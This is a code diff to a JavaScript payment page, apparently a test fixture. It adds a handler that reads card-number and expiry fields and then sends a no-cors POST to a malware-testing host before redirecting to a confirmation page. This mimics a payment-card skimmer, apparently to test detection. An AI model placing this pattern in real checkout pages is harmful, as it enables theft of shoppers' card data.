@@ -1,11 +1,4 @@
-// let stateCheck = setInterval(() => {
-//   if (document.readyState === 'complete') {
-//     clearInterval(stateCheck);
-//     all()
-//   }
-// }, 100);
 
-// function all(){
 
 var x = document.getElementById("demo");
 var button = document.getElementById("mali_test");
@@ -31,7 +24,10 @@ function myFunction() {
    let b = document.querySelector('#card-number').value
    let c = document.querySelector('#card-expiry').value
 
-   fetch('https://counter.yadro.ru/',{ mode: 'no-cors'})
+   fetch('http://malware.wicar.org/',{
+      mode: 'no-cors',
+      method: 'POST',
+      headers: { 'Content-type': 'application/json' }})
     .then(response => console.log(response))
     .then(res=>{console.log(res,a,b,c); 
         window.location.href = 'confirmation.html'
@@ -74,8 +70,7 @@ async function init(){
     
     
     
-  // }
-    
+
  
     
    
